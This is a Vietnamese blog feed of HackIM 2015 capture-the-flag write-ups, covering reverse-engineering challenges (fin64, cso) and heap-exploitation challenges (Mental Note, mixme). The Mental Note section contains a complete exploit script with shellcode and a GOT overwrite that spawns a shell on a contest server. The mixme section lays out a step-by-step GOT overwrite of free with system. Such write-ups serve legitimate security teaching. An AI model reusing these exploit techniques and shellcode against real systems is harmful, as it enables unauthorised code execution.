+fin64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x9b62a9678a30ce6c576131024148154a0bc5575d, stripped</pre>
+<p>khi chạy và thử nhiều cách input, đều có kết quả "Not yet.."</p>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ ./fin64
+Not yet..</pre>
+<p>main khá ngắn, ta dịch lần lượt<br />
+để ý, có 2 cái good_boy và bad_boy trong hình</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?ssl=1"><img data-attachment-id="274" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_1/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=657%2C306&amp;ssl=1" data-orig-size="657,306" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_1" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=300%2C140&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=604%2C281&amp;ssl=1" class="alignnone size-full wp-image-274" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=604%2C281&#038;ssl=1" alt="fin64_1" width="604" height="281" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?w=657&amp;ssl=1 657w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=300%2C140&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>đầu tiên là func_systime<br />
+gọi syscall 0xc9 để lấy timestamp sao đó lưu giá trị vào [rbp-18h]</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?ssl=1"><img data-attachment-id="275" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" data-orig-size="515,294" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=300%2C171&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" class="alignnone size-full wp-image-275" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=515%2C294&#038;ssl=1" alt="fin64_2" width="515" height="294" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?w=515&amp;ssl=1 515w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=300%2C171&amp;ssl=1 300w" sizes="(max-width: 515px) 100vw, 515px" data-recalc-dims="1" /></a></p>
+<p>func_ctime - convert timestamp thành giá trị giây:phút:giờ:ngày:tháng:năm =&gt; lưu vào [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?ssl=1"><img data-attachment-id="276" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" data-orig-size="477,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=300%2C82&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" class="alignnone size-full wp-image-276" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=477%2C131&#038;ssl=1" alt="fin64_3" width="477" height="131" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?w=477&amp;ssl=1 477w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=300%2C82&amp;ssl=1 300w" sizes="(max-width: 477px) 100vw, 477px" data-recalc-dims="1" /></a></p>
+<p>dừng ở đây, jump ngược từ good_boy và bad_boy ta thấy có đoạn sử dụng [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?ssl=1"><img data-attachment-id="277" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_4/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" data-orig-size="442,380" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_4" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=300%2C258&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?fit=442%2C380&amp;ssl=1" class="alignnone size-full wp-image-277" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=442%2C380&#038;ssl=1" alt="fin64_4" width="442" height="380" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?w=442&amp;ssl=1 442w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_4.png?resize=300%2C258&amp;ssl=1 300w" sizes="(max-width: 442px) 100vw, 442px" data-recalc-dims="1" /></a></p>
+<p>nếu [rbp-10h] ở không bị thay đổi thì đoạn code pseudo ntn:</p>
+<pre class="lang:default decode:true ">[rbp-24h] = [dw_time+16]+1 = tháng
+[rbp-20h] = [dw_time+12] = ngày
+[rbp-1ch] = [dw_time+20] + 1900 = năm
+if ( [rbp-24h] == 9 &amp;&amp; [rbp-20h] == 10 &amp;&amp; [rbp-1ch] == 2011 )
+	good_boy
+else
+	bad_boy</pre>
+<p>thử đặt lại time là 10/9/2011 và run =&gt; still failed :wth:</p>
+<p>giờ ta jump back từ đoạn compare trên đến ngay sau chỗ convert, patch những đoạn jump để bypass khoảng ở giữa và chạy lại 1 lần nữa</p>
+<pre class="lang:default decode:true ">$ ./fin64
+Oops..</pre>
+<p>Good bj, mình đoán flag nằm trong memory, thử trace dần vào good_boy</p>
+<p>thì phát hiện ra cái này *byte_6c2070</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?ssl=1"><img data-attachment-id="278" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_5-2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=789%2C214&amp;ssl=1" data-orig-size="789,214" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_5" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=300%2C81&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?fit=604%2C164&amp;ssl=1" class="alignnone size-full wp-image-278" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=604%2C164&#038;ssl=1" alt="fin64_5" width="604" height="164" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?w=789&amp;ssl=1 789w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_51.png?resize=300%2C81&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>next-challenge</p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 500 - cso</span></h2>
+<p>bài này thực sự không biết nên viết writeup như thế nào vì công nhận là nó khá bựa và cách làm cũng ngẫu hứng vãi nhái :3</p>
+<p>sau hồi dịch mình chả biết nó là cái giống gì, có vẻ giống virtual machine nhưng cũng ko giống lắm =)), đại khái nó như này:</p>
+<pre class="lang:python decode:true ">main:
+	print(Bla bla bla)
+	gets(st) #main input
+	len_st = strlen(st)
+	super = 0x24ae5af1 #first magic hex
+	while True:
+		A: 
+			if super-a1&gt;0: jump b1
+		B: 
+			if super-a2&gt;0: jump b2
+		C: 
+			if super-a3&gt;0: jump b3
+		...
+		V: 
+			if super-an&gt;0: jump bn
+		X:
+			super = a(n+1)
+		Y:
+			super = a(n+2)
+		...
+		Z:
+			super = am
+		quit:
+			break
+		dead: 
+			puts("You are dead man")
+			super = super_to_quit
+			continue
+		win: 
+			puts("You are safe and live forever")
+			super = super_to_quit
+			continue
+		check_len: 
+			if len_st==0x1A: 
+				super = super_to_stage2
+			else:
+				super = super_to_dead
+			continue
+		stage_2:
+			#func_stage2 ở địa chỉ 0x00400ec0
+			if func_stage2(st)==1: 
+				super = super_to_win
+			else:
+				super=super_to_dead
+			continue
+
+#mấy số a1, a2, ...an, a(n+1), ... , am là magic const, ko biết có quy luật gì những mà nó đc build để tính toán hợp lí
+#các jump b1, b2, b3, ... bn là nhãn của một trong mấy thằng A,B,C,...V, quit, dead, win, check_len, stage_2
+
+			
+def stage2(st):
+	#cấu trúc đệ quy
+	#vòng lặp tương tự main
+	#có thêm 1 số sub function phụ</pre>
+<p>Không biết flag ở chỗ nào luôn, code follow control dựa vào mấy phép cộng của a(i), giờ tìm quy luật cho nó cũng đuối đơ. Có duy nhất 1 cái chắc chắn là len_st = 0x1A = 26 (!!!)</p>
+<p>Sau nửa tiếng suy nghĩ, mình thấy khi input với len = 26 và len &lt; 26 thì cảm giác debug lâu hơn. Suy nghĩ: Side channel dựa vào instruction count được không?</p>
+<pre class="lang:sh decode:true ">$ python -c "print 'a'*26" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123368
+
+$ python -c "print 'a'*25" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097
+
+$ python -c "print 'a'*24" | ./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ~/Desktop/cso | cat inscount.out 
+Count 123097</pre>
+<p>Bingo, chuẩn girl mất rồi, side channel bem lần lượt các char</p>
+<pre class="lang:python decode:true">import subprocess
+import time
+
+sam = "abcdefghijklmnopqrstuvwxyz"
+sam += sam.upper()
+sam += "0123456789_!,.{}"
+
+#217826 SRRDRSSRSRRDDSSSRSSDSDDDSS
+
+def insco(fl):
+	fl += 'a'*(26-len(fl))
+	open('hellyeah','wt').write(fl)
+	subprocess.call("./pin -t source/tools/ManualExamples/obj-intel64/inscount0.so -- ../cso &lt; hellyeah", shell=True)
+	time.sleep(0.2)
+	k = open("inscount.out").read().strip().split(' ')[1]
+	print "-----", fl, k
+	return int(k)
+
+def dequy(fl):
+	if len(fl)==26:
+		print fl
+		raw_input("&lt;&lt; Another result, enter for the next...")
+	else:
+		a = insco(fl + 'a')
+		#Cho nay sample chi co 1 ki tu trong string "SRD" thoi (manual check), co the set sam = "SRD" side channel nhanh hon
+		for c in sam:
+			cou = insco(fl + c)
+			if cou-a&gt;400: dequy(fl + c)
+
+
+dequy('')</pre>
+<p>=&gt; Final <span style="color: #ff0000;">SRRDRSSRSRRDDSSSRSSDSDDDSS</span>. Không giống flag cho lắm :-ss</p>
+<p>Input test lại vẫn "You are dead man". Wut dafuq, đúng quá rồi còn gì.<br />
+Check lại cái inscount thì thấy có sự chênh lệch rất lớn ins.<br />
+Có thể là những mini-sub trong stage2 (0x00400ec0)<br />
+Kiểm tra lần lượt từng mini-sub đó ta thấy có sub_400BD0 sử dụng biến global(s) chính là string input ban đầu?!?</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?ssl=1"><img data-attachment-id="280" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_1/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" data-orig-size="532,82" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_1" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=300%2C46&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?fit=532%2C82&amp;ssl=1" class="alignnone size-full wp-image-280" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=532%2C82&#038;ssl=1" alt="cso_1" width="532" height="82" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?w=532&amp;ssl=1 532w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_1.png?resize=300%2C46&amp;ssl=1 300w" sizes="(max-width: 532px) 100vw, 532px" data-recalc-dims="1" /></a></p>
+<p>Đặt breakpoint ngay tại đó và input đúng như trên, sau 1 số lần trace thì ...</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?ssl=1"><img data-attachment-id="281" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" data-orig-size="503,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=300%2C78&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?fit=503%2C131&amp;ssl=1" class="alignnone size-full wp-image-281" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=503%2C131&#038;ssl=1" alt="cso_2" width="503" height="131" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?w=503&amp;ssl=1 503w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_2.png?resize=300%2C78&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a><br />
+Âu Mai Gót, call cái địa chỉ vừa trả về, không phải run shell thì là run cái gì nữa =))</p>
+<p>Chuyển hướng sang disass con shell, tương tự 3 bài rồi</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?ssl=1"><img data-attachment-id="279" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/cso_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" data-orig-size="503,230" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cso_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=300%2C137&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?fit=503%2C230&amp;ssl=1" class="alignnone size-full wp-image-279" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=503%2C230&#038;ssl=1" alt="cso_3" width="503" height="230" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?w=503&amp;ssl=1 503w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/cso_3.png?resize=300%2C137&amp;ssl=1 300w" sizes="(max-width: 503px) 100vw, 503px" data-recalc-dims="1" /></a></p>
+<p>move rất nhiều ASCII Char vào memory, ghép lại thì thấy đó là 1 chuỗi base32 <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f61b.png" alt="😛" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>Hard time gone <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f61b.png" alt="😛" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<pre class="lang:python decode:true">s = "MZWGCZ33NV4V6YZQNVYDINJVL4YTKX3VNYYXC5JTPU"
+sam = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+
+def tobin(t):
+    st = bin(t).replace('0b','')
+    st = '0'*(5-len(st)) + st
+    return st
+
+k = ''
+for i in s:
+    t = sam.find(i)
+    print i, sam.find(i), tobin(t)
+    k += tobin(t)
+
+k = k[0:208]
+print hex(int(k,2))[2:].replace('L','').decode('hex')</pre>
+<p><span style="color: #ff0000;"><strong>flag{my_c0mp455_15_un1qu3}</strong></span></p>
+<p>--------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">PWN 400 - Mental Note</span></h2>
+<p>bài này về cơ bản khá giống <a title="PWN500 - mixme" href="https://babyphd.net/2015/01/write-up-hackim-ctf-mixme-pwn5/" target="_blank">mixme</a></p>
+<p>cấu trúc dữ liệu:</p>
+<pre class="lang:c decode:true">struct note{
+	int size;
+	note* next_note;
+	note* prev_note;
+	content[linh động]
+}</pre>
+<p>và array_note[999] lưu địa chỉ con trỏ của mỗi note được thêm</p>
+<p>có 3 loại note:</p>
+<pre class="lang:default decode:true ">loại 0 : content 100 bytes
+loại 1 : content 200 bytes
+loại 2 : content 400 bytes</pre>
+<p>* add-note, người dùng nhập 1 loại note sau đó chương trình malloc 1 lượng bộ nhớ vừa đủ phần header+content size =&gt; new_note</p>
+<p>new_note được insert vào array_note sau khi đã check-note (dựa vào note header) để tìm id phù hợp.</p>
+<p>* edit-note, người dùng nhập id, loại note và read(note-id-content, size=note-type) mà ko check xem note ở id ấy có đúng loại không.<br />
+=&gt; nếu note add vào là loại 0 mà khi edit với loại 1/2 thì sẽ overwrite được sang header note khác.</p>
+<p>bằng cách này ta sẽ chỉnh phần header của note kế tiếp để khai thác lỗi check-note của add-note function.</p>
+<p>Payload:</p>
+<pre class="lang:python decode:true ">import socket, time
+
+def send(s, m):
+    print "[SEND]", m
+    s.send(m)
+
+def recv(s):
+    t = s.recv(4096)
+    print "[RECV]", t
+    return t
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect (( "54.163.248.69",9004 ))
+
+recv(s)
+recv(s)
+
+#Add 3 notes, Type 0
+for i in range(3):
+	send(s, "1\n")
+	recv(s)
+	send(s, "0\n")
+	recv(s)
+
+#Edit note id=2, Type=0, shellcode
+send(s, "3\n")
+recv(s)
+send(s, "2\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+#shell
+shell = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+send(s, "\x90"*20 + shell)
+recv(s)
+
+#Edit note id=0, Type=1, overwrite header and change g0t.plt
+send(s, "3\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+send(s, "1\n")
+recv(s)
+#magic bytes
+send(s, (0x80-12)*'a' + "\x04\xc1\xeb\x0f\x1c\xb0\x04\x08")
+recv(s)
+
+#jump to shellcode by function was changed in g0t.plt
+send(s, "1\n")
+recv(s)
+send(s, "0\n")
+recv(s)
+
+send(s,"cat flag.txt\n")
+recv(s)
+
+#flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
+
+s.close()</pre>
+<p><span style="color: #ff0000;"><strong>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</strong></span> !!!</p>
+<p><em>So long and deep, go get some sleep :'( . Chim!</em></p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">259</post-id>	</item>
+		<item>
+		<title>[Write Up] Hackim CTF - mixme - PWN5</title>
+		<link>https://babyphd.net/2015/01/12/write-up-hackim-ctf-mixme-pwn5/</link>
+				<pubDate>Mon, 12 Jan 2015 05:35:09 +0000</pubDate>
+		<dc:creator><![CDATA[peternguyen]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=237</guid>
+				<description><![CDATA[Đánh giá sơ lược về binary: ~/Sources/CTFs/hackim » file mixme peternguyen@peternguyen mixme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b93d20dd523097dd7d53a7fda265a2d977d29c30, stripped Checksec: Chương trình có 3 lệnh chính: (store/edit/get) Phân tích hàm edit Đựa trên hàm store, mình có thể reverse lại được cấu trúc &#8230; <a href="https://babyphd.net/2015/01/12/write-up-hackim-ctf-mixme-pwn5/" class="more-link">Continue reading <span class="screen-reader-text">[Write Up] Hackim CTF - mixme - PWN5</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Đánh giá sơ lược về binary:</p>
+<pre class="lang:zsh decode:true">~/Sources/CTFs/hackim » file mixme                               peternguyen@peternguyen
+mixme: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b93d20dd523097dd7d53a7fda265a2d977d29c30, stripped</pre>
+<p>Checksec:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111306AM_zps163b811d.png?resize=284%2C208" alt="" width="284" height="208" data-recalc-dims="1" /></p>
+<p>Chương trình có 3 lệnh chính: (<strong>store</strong>/<strong>edit</strong>/<strong>get</strong>)</p>
+<h5><strong>Phân tích hàm edit</strong></h5>
+<p>Đựa trên hàm store, mình có thể reverse lại được cấu trúc lưu trữ của chương trình như sau:</p>
+<pre class="lang:c decode:true">struct node{
+ char name[16];
+ int size;
+ char *data;
+ struct node *next;
+ struct node *prev;
+}</pre>
+<p>size là khích cỡ vùng nhớ được malloc cho data.</p>
+<p>Các node được lưu trữ bằng một danh sách double linked list circular</p>
+<p><img class="alignnone" src="https://i2.wp.com/3.bp.blogspot.com/_B6yuuJdg78o/TRzylm315aI/AAAAAAAAAKk/KKU-be6yPlI/s1600/image018.jpg?resize=458%2C92&#038;ssl=1" alt="" width="458" height="92" data-recalc-dims="1" /></p>
+<p>Vùng nhớ tổ chức trong mem như sau (tạo 2 block với data size = 16:</p>
+<p><a href="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111248AM_zpsca72a939.png"><img src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111248AM_zpsca72a939.png?resize=604%2C197" alt="" width="604" height="197" data-recalc-dims="1" /></a></p>
+<p>Gồm 3 block: block head được khởi tạo mặc định khi chạy chương trình.</p>
+<p>Để ý phần data của block được cấp phát là 1 đoạn đằng sau block, tôi sẽ đề cập sau ở phần khai thác lỗi.</p>
+<h5><strong>Phân tích hàm edit</strong></h5>
+<p>Nhập name,và size, hàm sẽ duyệt qua linked list để tìm ra block có tên tương ứng, và cập nhật lại phần data.</p>
+<p>Để ý phần sau:</p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111102AM_zpse1ead7c3.png?resize=604%2C299" alt="" width="604" height="299" data-recalc-dims="1" /></p>
+<p><img class="alignnone" src="https://i0.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111018AM_zps6288871d.png?resize=604%2C176" alt="" width="604" height="176" data-recalc-dims="1" /></p>
+<p>Chương trình đọc từ stdin vào data <strong>nbytes</strong>, mà nbytes không check length.</p>
+<p>Nếu tạo 2 block liền nihau thì, phần tiếp theo phần data của block 1 là block2 nên ta có thể overwrite được cái block 2.</p>
+<h5><strong>Phân tích hàm get:</strong></h5>
+<p>Nhập vào tên block và size, tìm ra block tương ứng, in phần data ra màn hình, free vùng data và block, cập nhật lại linked list. Để ý <strong>write(1,node-&gt;data,n); mình sẽ dùng nó để leak addr</strong></p>
+<p><img class="alignnone" src="https://i1.wp.com/i1343.photobucket.com/albums/o783/peter_nguyen93/ScreenShot2015-01-12at111000AM_zpsc4f6c36a.png?resize=604%2C197" alt="" width="604" height="197" data-recalc-dims="1" /></p>
+<h4>Khai thác lỗi.</h4>
+<p>Ở đây mình sẽ overwrite địa chỉ <strong>data</strong> bằng địa chỉ của một hàm trong bảng got bằng cách lợi dụng phần <strong>read(0,node-&gt;data,node-&gt;size)</strong></p>
+<p>Để ý hàm free(node-&gt;data) nhận input là phần data nhập vào, ý tưởng là overwrite free trong bảng got là system và ta có, system(node-&gt;data).</p>
+<p>Payload của mình làm theo các bước như sau:</p>
+<ol>
+<li>Tạo ra 2 block <strong>peter123,lol123</strong> với data size của mỗi block là 16 bytes</li>
+<li>edit block<strong> peter123</strong>: với size 56, 'D'*28 + '\x00' * 16 + 'CCCC', với CCCC =&gt; địa chỉ hàm free, sở dĩ mình padd '\x00'*16 byte để làm name của block2 = 'DDDD'.</li>
+<li>edit block 2 ('DDDD') với size 4 bytes để ghi đè free trong bảng got ở đây mình ghi đè got bằng địa chỉ của lệnh ret, mục đích là để bypass qua hàm free, vì mình lợi dụng lệnh ret để leak 1 địa chỉ trong bảng GOT.</li>
+<li>get block 2('DDDD') minh sẽ leak được 1 địa chỉ trong bảng GOT, từ đó tính được địa chỉ hàm system.</li>
+<li>Tạo tiếp 2 block bất kì (<strong>b1,b2</strong>) với data size của mỗi block là 16 bytes</li>
+<li>edit block1('b1') ghi đè địa chỉ data của block 2 bằng địa chỉ free một lần nữa</li>
+<li>edit block2() để ghi đè free bằng system.</li>
+<li>Tạo ra block 'shell' với phần data='/bin/sh'</li>
+<li>get block('shell') và boom đã có được shell</li>
+</ol>
